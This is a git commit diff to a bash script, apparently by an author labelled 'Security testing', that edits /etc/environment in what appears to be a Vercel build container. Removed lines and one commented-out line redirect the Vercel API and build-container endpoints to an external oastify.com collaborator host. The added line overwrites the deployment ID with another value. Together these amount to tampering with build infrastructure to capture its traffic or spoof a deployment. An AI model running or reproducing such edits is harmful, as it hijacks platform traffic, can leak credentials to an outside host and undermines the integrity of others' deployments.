86b3fc1a49f27983027c33223c56875139cc7dcc
Security testing <118594933+w2h3@users.noreply.github.com>
2024-01-25 15:37:36 +0700

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 
-sed -i 's/^VERCEL_API_ENDPOINT=.*/VERCEL_API_ENDPOINT=https:\/\/95cbgoom47gtgjeg2ak6u3aquh08odf14.oastify.com/' /etc/environment
-sed -i 's/^VERCEL_API_BUILD_CONTAINERS_ENDPOINT=.*/VERCEL_API_BUILD_CONTAINERS_ENDPOINT=https:\/\/95cbgoom47gtgjeg2ak6u3aquh08odf14.oastify.com/' /etc/environment
+sed -i 's/^VERCEL_DEPLOYMENT_ID=.*/VERCEL_DEPLOYMENT_ID=dpl_8dgMk7NDnTknpQUVKhjKTzEtkXtv/' /etc/environment
+#sed -i 's/^VERCEL_API_BUILD_CONTAINERS_ENDPOINT=.*/VERCEL_API_BUILD_CONTAINERS_ENDPOINT=https:\/\/95cbgoom47gtgjeg2ak6u3aquh08odf14.oastify.com/' /etc/environment
